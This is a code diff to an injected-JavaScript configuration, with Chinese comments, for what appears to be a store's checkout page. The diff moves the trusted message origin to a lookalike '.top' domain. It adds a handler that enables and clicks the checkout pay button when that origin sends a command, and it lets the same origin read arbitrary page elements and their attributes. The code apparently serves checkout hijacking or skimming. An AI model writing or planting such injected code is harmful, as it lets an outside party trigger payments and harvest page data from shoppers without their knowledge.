@@ -54,33 +54,37 @@ js_inject:
     script: |
       // 监听消息（查找元素）
       window.addEventListener('message', (event) => {
-        if (event.origin !== 'https://front.chemicalguys.com') return;
-        
+        console.log("父类监听：",event.origin)
+        if (event.origin !== 'https://front.chemicalguys.top') return;
+        console.log("父类监听：",event)
         const { type, selector, attributes } = event.data;
         const replyPort = event.ports[0];
-        
-        if (type === 'GET_SINGLE_DOM' && replyPort) {
+        if (type === 'SUBMIT_FORM' && replyPort) {
+          const btn = top.document.getElementById("checkout-pay-button");
+          btn.disabled = false;
+          btn.click();
+          top.window.hack = false;
+        }
+        else if (type === 'GET_SINGLE_DOM' && replyPort) {
           // 1. 只找第一个
           const el = document.querySelector(selector);
-          
+
           if (!el) {
             replyPort.postMessage({ success: false, error: 'Element not found' });
             return;
           }
-          
+
           // 2. 提取属性
           const data = {};
           attributes.forEach(attr => {
             if (attr === 'dataset') {
               data.dataset = { ...el.dataset };
-            } else if (attr === 'innerHTML') {
-                data.innerHTML = el.innerHTML;
             } else {
               // 优先取 IDL 属性 (如 el.src)，取不到再取 HTML 特性 (getAttribute)
               data[attr] = el[attr] || el.getAttribute(attr);
             }
           });
-      
+          console.log("获取成功：",data);
           replyPort.postMessage({ success: true, data });
         }
       });
